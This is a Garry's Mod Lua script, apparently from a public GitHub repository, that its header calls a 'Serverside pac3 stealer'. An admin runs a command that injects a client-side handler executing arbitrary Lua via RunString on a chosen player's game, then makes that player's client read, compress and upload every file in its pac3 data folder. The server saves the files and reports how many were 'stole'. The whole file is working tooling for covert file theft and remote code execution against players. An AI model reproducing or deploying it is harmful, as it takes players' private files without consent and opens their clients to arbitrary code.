--[[
	https://github.com/awesomeusername69420/miscellaneous-gmod-stuff
	
	Serverside pac3 stealer
	
	usage: pac4 (SteamID OR SteamID64 OR name OR part of their name)
	output: data folder -> pac4 -> player's SteamID64 -> filename
]]

util.AddNetworkString("pac4")
util.AddNetworkString("pac5")

file.CreateDir("pac4")

local function FindPlayer(data)
	if not data then return NULL end
	
	local ply = player.GetBySteamID(data) or player.GetBySteamID64(data)
	
	if IsValid(ply) then return ply end
	
	for _, v in ipairs(player.GetAll()) do
		if v:GetName():lower():find(data) then
			return v
		end
	end
	
	return NULL
end

local function MassSendLua(ply, lua) -- Bypass 255 byte SendLua limit
	if not IsValid(ply) or not ply:IsFullyAuthenticated() then return end
	
	if not ply._Pac4IsSetup then
		ply:SendLua([=[
			net.Receive("pac4", function()
				RunString(net.ReadString())
			end)
		]=])
		
		ply._Pac4IsSetup = true
	end
	
	net.Start("pac4")
		net.WriteString(lua)
	net.Send(ply)
end

net.Receive("pac4", function(len, ply)
	if not ply._Pac4WasRequested or ply._Pac4Received >= ply._Pac4Limit then return end
	
	ply._Pac4Received = ply._Pac4Received + 1

	local name = net.ReadString()

	local dLen = net.ReadUInt(16)
	local data = net.ReadData(dLen)
	
	local contents = util.Decompress(data)
	
	file.CreateDir("pac4/" .. ply:SteamID64())
	
	file.Write("pac4/" .. ply:SteamID64() .. "/" .. name, contents)
	
	if ply._Pac4Received >= ply._Pac4Limit then
		if IsValid(ply._CallingPly) then
			ply._CallingPly:ChatPrint("[Pac4] - Successfully stole " .. ply._Pac4Received .. " files. " .. (ply._Pac4Limit - ply._Pac4Received ) .. " failed.")
		end
	
		ply._Pac4WasRequested = false
		ply._Pac4Limit = 0
		ply._Pac4LimitSet = false
		ply._Pac4Received = 0
		ply._CallingPly = NULL
	end
end)

net.Receive("pac5", function(len, ply)
	if not ply._Pac4WasRequested or ply._Pac4LimitSet then return end

	ply._Pac4Limit = net.ReadUInt(16)
	ply._Pac4LimitSet = true
end)

concommand.Add("pac4", function(ply, _, args, argstr)
	if not ply:IsAdmin() or not ply:IsSuperAdmin() then return end
	
	local tply = FindPlayer(argstr)
	
	if not IsValid(tply) then
		ply:ChatPrint("[Pac4] - Player not found")
		return
	end
	
	if not tply:IsFullyAuthenticated() then
		ply:ChatPrint("[Pac4] - Player not ready")
		return
	end
	
	tply._CallingPly = ply
	tply._Pac4WasRequested = true
	tply._Pac4Limit = 0
	tply._Pac4LimitSet = false

	MassSendLua(tply, [=[
		net.Receive("pac5", function()
			local f, _ = file.Find("pac3/*", "DATA")

			net.Start("pac5")
				net.WriteUInt(#f, 16)
			net.SendToServer()
		end)
	]=])
	
	net.Start("pac5")
	net.Send(tply)
	
	timer.Simple(tply:Ping() / 10, function()
		tply._Pac4Received = 0
	
		MassSendLua(tply, [=[
			local f, _ = file.Find("pac3/*", "DATA")
			
			for _, v in ipairs(f) do
				local cData = util.Compress(file.Read("pac3/" .. v, "DATA"))
			
				net.Start("pac4")
					net.WriteString(v)
					net.WriteUInt(#cData, 16)
					net.WriteData(cData, #cData)
				net.SendToServer()
			end
		]=])
	end)
end)
